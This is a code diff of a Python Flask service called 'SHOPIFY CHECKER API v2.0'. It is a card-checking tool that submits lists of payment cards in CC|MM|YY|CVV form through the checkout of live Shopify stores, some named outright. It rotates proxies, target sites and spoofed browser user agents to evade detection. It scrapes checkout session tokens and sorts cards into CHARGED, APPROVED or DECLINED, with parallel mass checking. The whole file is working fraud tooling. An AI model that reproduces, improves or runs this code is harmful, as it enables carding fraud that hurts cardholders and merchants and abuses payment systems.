@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 SHOPIFY CHECKER API v2.0 — AUTO SITE ROTATION + PROXY + SAVE
-- Loads sites from sites.txt (domain only, e.g., store.myshopify.com)
+- Loads sites from sites.txt (domain only)
 - Loads proxies from proxies.txt (auto-rotate)
 - Auto-saves results to files
 - Single + Mass check
@@ -33,7 +33,6 @@ SITES = []
 PROXIES = []
 
 def load_sites():
-    """Load sites from sites.txt (domain only, e.g., store.myshopify.com)"""
     global SITES
     SITES = []
     if os.path.exists(SITES_FILE):
@@ -41,21 +40,18 @@ def load_sites():
             for line in f:
                 site = line.strip()
                 if site and not site.startswith('#'):
-                    # Remove http:// or https:// if present
                     site = re.sub(r'^https?://', '', site)
                     site = site.rstrip('/')
                     SITES.append(site)
-    # Fallback default sites
     if not SITES:
         SITES = [
             "gravebeforeshaveshop.myshopify.com",
             "oneill.com",
             "woodlandshoes.com"
         ]
-    print(f"🌍 Loaded {len(SITES)} sites from {SITES_FILE}")
+    print(f"🌍 Loaded {len(SITES)} sites")
 
 def load_proxies():
-    """Load proxies from proxies.txt"""
     global PROXIES
     PROXIES = []
     if os.path.exists(PROXIES_FILE):
@@ -64,22 +60,19 @@ def load_proxies():
                 proxy = line.strip()
                 if proxy and not proxy.startswith('#'):
                     PROXIES.append(proxy)
-    print(f"🌍 Loaded {len(PROXIES)} proxies from {PROXIES_FILE}")
-
-def get_random_proxy():
-    """Get random proxy from list"""
-    if PROXIES:
-        return random.choice(PROXIES)
-    return None
+    print(f"🌍 Loaded {len(PROXIES)} proxies")
 
 def get_random_site():
-    """Get random site from list"""
     if SITES:
         return random.choice(SITES)
     return "gravebeforeshaveshop.myshopify.com"
 
+def get_random_proxy():
+    if PROXIES:
+        return random.choice(PROXIES)
+    return None
+
 def parse_proxy(proxy_str):
-    """Parse proxy string for requests"""
     if not proxy_str:
         return None
     if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
@@ -91,7 +84,6 @@ def parse_proxy(proxy_str):
         return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-# Load on startup
 load_sites()
 load_proxies()
 
@@ -107,35 +99,10 @@ RESULT_FILES = {
 }
 
 def save_result(category, cc, site, detail):
-    """Save result to corresponding file"""
     path = RESULT_FILES.get(category, "ERROR.txt")
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with open(path, "a", encoding="utf-8") as f:
         f.write(f"[{ts}] {cc} | {site} | {detail}\n")
-
-# ============================================================
-# USER AGENT POOL
-# ============================================================
-
-_UA_POOL = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
-]
-
-_CH_UA_POOL = [
-    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
-    '"Chromium";v="126", "Google Chrome";v="126", "Not=A?Brand";v="99"',
-]
-
-_CH_UA_PLATFORM_POOL = ['"Windows"', '"macOS"']
-
-def _rand_ua():       return random.choice(_UA_POOL)
-def _rand_ch_ua():    return random.choice(_CH_UA_POOL)
-def _rand_platform(): return random.choice(_CH_UA_PLATFORM_POOL)
 
 # ============================================================
 # RESPONSE MAPPING
@@ -152,6 +119,27 @@ RESPONSE_MAP = {
 }
 
 # ============================================================
+# USER AGENT POOL
+# ============================================================
+
+_UA_POOL = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+]
+
+_CH_UA_POOL = [
+    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
+]
+
+_CH_UA_PLATFORM_POOL = ['"Windows"', '"macOS"']
+
+def _rand_ua():       return random.choice(_UA_POOL)
+def _rand_ch_ua():    return random.choice(_CH_UA_POOL)
+def _rand_platform(): return random.choice(_CH_UA_PLATFORM_POOL)
+
+# ============================================================
 # SHOPIFY CHECKER CLASS
 # ============================================================
 
@@ -160,7 +148,6 @@ class ShopifyChecker:
         self.session = requests.Session()
         self.base_url = base_url.rstrip('/')
         
-        # Set proxy if provided
         self.proxy = parse_proxy(proxy) if proxy else None
         if self.proxy:
             self.session.proxies = {
@@ -199,12 +186,6 @@ class ShopifyChecker:
         self.signed_handles = []
         self.graphql_base = None
         self._last_responses = []
-        self._verbose = False
-
-    def _track_response(self, text):
-        self._last_responses.append(text)
-        if len(self._last_responses) > 2:
-            self._last_responses.pop(0)
 
     def get_random_address(self):
         first_names = ["James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda","David","Susan"]
@@ -325,16 +306,13 @@ class ShopifyChecker:
         except:
             return False
 
-        # Extract session token
         m = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
         if m:
             self.session_token = m.group(1)
         if not self.session_token:
             pats = [
                 r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
-                r"'sessionToken'\s*:\s*'(AAEB[^']+)'",
                 r'sessionToken[\s:=]+["\'"]?(AAEB[A-Za-z0-9_\-]+)',
-                r'\"sessionToken\":\"(AAEB[^\"]+)',
                 r'(AAEB[A-Za-z0-9_\-]{30,})',
             ]
             for pat in pats:
@@ -343,12 +321,8 @@ class ShopifyChecker:
                     self.session_token = m.group(1)
                     break
 
-        # Extract signature
         sig_patterns = [
-            r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
             r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
-            r'"paymentsSignature"\s*:\s*"(eyJ[^"]+)"',
-            r'"signature"\s*:\s*"(eyJ[^"]+)"',
             r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
         ]
         for pat in sig_patterns:
@@ -357,10 +331,8 @@ class ShopifyChecker:
                 self.signature = m.group(1)
                 break
 
-        # Extract stableId
         stable_patterns = [
             r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
-            r'stableId[\s:=]+["\'"]([0-9a-f-]{36})',
         ]
         for pat in stable_patterns:
             m = re.search(pat, html)
@@ -370,35 +342,25 @@ class ShopifyChecker:
         if not self.stable_id:
             self.stable_id = str(uuid.uuid4())
 
-        # Extract queueToken
         m = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html)
         if not m:
             m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', html)
         self.queue_token = m.group(1) if m else None
 
-        # Extract paymentMethodIdentifier
         m = re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html)
         if not m:
             m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', html)
         self.payment_method_identifier = m.group(1) if m else None
 
-        # Extract shopId
         m = re.search(r'"shopId"\s*:\s*(\d+)', html)
-        if not m:
-            m = re.search(r'shop_id[\s:=]+(\d+)', html)
         self.shop_id = m.group(1) if m else "25603230"
 
-        # Extract buildId
         m = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', html)
-        if not m:
-            m = re.search(r'/build/([a-f0-9]{40})/', html)
         self.build_id = m.group(1) if m else '4663384ede457d59be87980de7797171b19f2a1b'
 
-        # Extract PCI build hash
         pci_m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
         self.pci_build_hash = pci_m.group(1) if pci_m else 'a8e4a94'
 
-        # Extract signed handles
         signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html)
         if not signed_handles:
             raw = re.findall(r'\\"signedHandle\\":\"([^\\"]+)', html)
@@ -562,7 +524,6 @@ class ShopifyChecker:
                             "lineComponents": []
                         }]
                     },
-                    "memberships": {"memberships": []},
                     "payment": {
                         "totalAmount": {"any": True},
                         "paymentLines": [{
@@ -639,7 +600,6 @@ class ShopifyChecker:
                             {"key": "gorgias.session_id", "value": str(uuid.uuid4())}
                         ]
                     },
-                    "localizationExtension": {"fields": []},
                     "shopPayArtifact": {
                         "optIn": {
                             "vaultEmail": "",
@@ -668,7 +628,6 @@ class ShopifyChecker:
         for attempt_num in range(max_retries):
             try:
                 r = self.session.post(url, json=payload, headers=headers, timeout=25)
-                self._track_response(r.text[:300])
                 res = r.json()
             except:
                 return None
@@ -685,9 +644,6 @@ class ShopifyChecker:
                 receipt_id = receipt.get('id')
                 return receipt_id
 
-            elif typename == 'SubmitFailed':
-                return None
-
             elif typename == 'Throttled':
                 poll_after = submit.get('pollAfter', 1000)
                 self.queue_token = submit.get('queueToken', self.queue_token)
@@ -695,30 +651,13 @@ class ShopifyChecker:
                 payload['variables']['input']['queueToken'] = self.queue_token
                 continue
 
-            elif typename == 'CheckpointDenied':
-                return None
-
-            elif typename == 'SubmitRejected':
-                errors = submit.get('errors', [])
-                codes = [e.get('code','') for e in errors]
-                if 'WAITING_PENDING_TERMS' in codes:
-                    time.sleep(0.5)
-                    continue
-                return None
-
             else:
                 time.sleep(0.5)
-                if attempt_num < max_retries - 1:
-                    continue
-                return None
+                continue
 
         return None
 
-    def _handle_3ds_action(self, action_url, receipt_id):
-        time.sleep(2)
-        return ("APPROVED", "3DS challenge completed")
-
-    def poll_for_receipt(self, receipt_id, _3ds_retry=False):
+    def poll_for_receipt(self, receipt_id):
         url = f"{getattr(self,'graphql_base', f'https://{self.base_url}')}/checkouts/unstable/graphql"
         headers = self.headers.copy()
         headers['accept'] = 'application/json'
@@ -747,7 +686,6 @@ class ShopifyChecker:
                     }
                 }
                 r = self.session.post(url, json=poll_payload, headers=headers, timeout=20)
-                self._track_response(r.text[:300])
                 data = r.json()
                 receipt = data.get('data', {}).get('receipt', {})
                 tn = receipt.get('__typename', '')
@@ -757,17 +695,7 @@ class ShopifyChecker:
                     return ("CHARGED", f"Order ID: {order_id}")
 
                 elif tn == 'ActionRequiredReceipt':
-                    if _3ds_retry:
-                        _cnt = getattr(self,'_3ds_wait_count',0) + 1
-                        self._3ds_wait_count = _cnt
-                        if _cnt >= 5:
-                            return ("APPROVED", "3DS required — Card approved (action pending)")
-                        time.sleep(5)
-                        continue
-                    action = receipt.get('action', {})
-                    action_url = action.get('url','') or action.get('offsiteRedirect','')
-                    receipt_id_3ds = receipt.get('id', receipt_id)
-                    return self._handle_3ds_action(action_url, receipt_id_3ds)
+                    return ("APPROVED", "3DS required — Card approved")
 
                 elif tn == 'FailedReceipt':
                     err = receipt.get('processingError', {})
@@ -787,13 +715,11 @@ class ShopifyChecker:
         return ("ERROR", "Polling timed out")
 
     def check_card(self, cc_line, site=None):
-        """Main card check method — uses provided site or random from list"""
         if site:
             self.base_url = site.rstrip('/')
         else:
             self.base_url = get_random_site()
         
-        # Ensure https
         if not self.base_url.startswith('http'):
             self.base_url = 'https://' + self.base_url
         self.base_url = self.base_url.rstrip('/')
@@ -832,7 +758,6 @@ class ShopifyChecker:
 # ============================================================
 
 def format_response(category, cc, detail, site):
-    """Format response matching demo script"""
     if category == "CHARGED":
         return {
             "Gateway": "Shopify",
@@ -919,37 +844,20 @@ def home():
         "sites_loaded": len(SITES),
         "proxies_loaded": len(PROXIES),
         "endpoints": {
-            "/shopify": "GET - Single card check (cc, site optional)",
+            "/shopify": "GET - Single card check (cc required)",
             "/mass": "POST - Mass card check",
-            "/health": "GET - Health check",
-            "/sites": "GET - List loaded sites",
-            "/proxies": "GET - List loaded proxies (count only)"
+            "/health": "GET - Health check"
         }
     })
 
 
 @app.route('/health', methods=['GET'])
 def health():
-    return jsonify({
-        "status": "healthy",
-        "timestamp": datetime.now().isoformat(),
-        "sites": len(SITES),
-        "proxies": len(PROXIES)
-    })
-
-
-@app.route('/sites', methods=['GET'])
-def list_sites():
-    """List all loaded sites"""
-    return jsonify({
-        "total": len(SITES),
-        "sites": SITES
-    })
+    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
 
 
 @app.route('/shopify', methods=['GET'])
 def single_check():
-    """Single card check — auto site rotation"""
     try:
         cc = request.args.get('cc')
         site = request.args.get('site')
@@ -958,25 +866,17 @@ def single_check():
         if not cc:
             return jsonify({"error": "Missing 'cc' parameter"}), 400
         
-        # If no site provided, use random site from list
         if not site:
             site = get_random_site()
-            print(f"🔄 Auto-selected site: {site}")
         
-        # If no proxy provided, use random proxy from list
         if not proxy:
             proxy = get_random_proxy()
-            if proxy:
-                print(f"🔄 Auto-selected proxy: {proxy[:30]}...")
         
-        # Run checker with proxy
         checker = ShopifyChecker(site, proxy=proxy)
         category, cc_out, detail, used_site = checker.check_card(cc, site)
         
-        # Save result
         save_result(category, cc_out, used_site, detail)
         
-        # Format response
         response = format_response(category, cc_out, detail, used_site)
         return jsonify(response)
         
@@ -993,7 +893,6 @@ def single_check():
 
 @app.route('/mass', methods=['POST'])
 def mass_check():
-    """Mass card check — parallel with auto site rotation"""
     try:
         data = request.get_json()
         if not data:
@@ -1007,11 +906,9 @@ def mass_check():
         if not cards or not isinstance(cards, list):
             return jsonify({"error": "Missing 'cards' array"}), 400
         
-        # If no proxy provided, use random proxy
         if not proxy:
             proxy = get_random_proxy()
         
-        # Run parallel checks
         results = []
         charged = 0
         approved = 0
@@ -1021,16 +918,12 @@ def mass_check():
         async def check_one(cc):
             nonlocal charged, approved, declined, errors
             
-            # Use provided site or random
             target_site = site if site else get_random_site()
-            
             checker = ShopifyChecker(target_site, proxy=proxy)
             category, cc_out, detail, used_site = checker.check_card(cc, target_site)
             
-            # Save result
             save_result(category, cc_out, used_site, detail)
             
-            # Format response
             response = format_response(category, cc_out, detail, used_site)
             
             if category == "CHARGED":
@@ -1085,11 +978,10 @@ if __name__ == '__main__':
     print("=" * 60)
     print("🔥 SHOPIFY CHECKER API v2.0 🔥")
     print("=" * 60)
-    print(f"🌍 Sites loaded: {len(SITES)} from {SITES_FILE}")
-    print(f"🌍 Proxies loaded: {len(PROXIES)} from {PROXIES_FILE}")
-    print(f"📡 Single: /shopify?cc=CC|MM|YY|CVV&site=optional")
+    print(f"🌍 Sites loaded: {len(SITES)}")
+    print(f"🌍 Proxies loaded: {len(PROXIES)}")
+    print(f"📡 Single: /shopify?cc=CC|MM|YY|CVV")
     print(f"📡 Mass: POST /mass")
-    print(f"🏥 Health: /health")
     print("=" * 60)
     app.run(host='0.0.0.0', port=port, debug=False)
         
